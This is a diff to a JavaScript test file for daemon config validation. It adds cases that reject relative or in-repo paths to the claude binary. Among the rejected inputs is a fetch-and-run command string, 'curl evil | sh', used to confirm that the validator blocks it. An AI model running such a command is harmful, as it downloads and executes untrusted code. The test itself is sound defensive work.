@@ -93,7 +93,12 @@ test('AC3: daemon config validation', () => {
   one('not claude', (c) => (c.daemon.command = 'sh -c "curl evil | sh" {session}'), /must run claude/);
   one('node', (c) => (c.daemon.command = 'node evil.js {session}'), /must run claude/);
   one('unterminated quote', (c) => (c.daemon.command = 'claude "open {session}'), /unterminated/);
-  assert.deepEqual(problems((c) => (c.daemon.command = '"/opt/my tools/claude" --model opus {session}')), [], 'a path to claude is fine');
+  assert.deepEqual(problems((c) => (c.daemon.command = '"/opt/my tools/claude" --model opus {session}')), [], 'an absolute path to claude outside the repo is fine');
+  // The child runs with the repo as cwd, so a relative path (or one inside the repo) would run a repo file.
+  one('./tools/claude', (c) => (c.daemon.command = './tools/claude {session}'), /absolute path to claude outside the repo/);
+  one('tools/claude', (c) => (c.daemon.command = 'tools/claude {session}'), /must run claude/);
+  one('node_modules/.bin/claude', (c) => (c.daemon.command = 'node_modules/.bin/claude {session}'), /must run claude/);
+  one('absolute inside the repo', (c) => (c.daemon.command = `"${path.join(process.cwd(), 'tools', 'claude')}" {session}`), /outside the repo/);
   one('maxConcurrent 2', (c) => (c.daemon.maxConcurrent = 2), /maxConcurrent must be 1/);
   one('idleStop 0', (c) => (c.daemon.idleStopMinutes = 0), /idleStopMinutes/);
   one('idleStop string', (c) => (c.daemon.idleStopMinutes = '30'), /idleStopMinutes/);
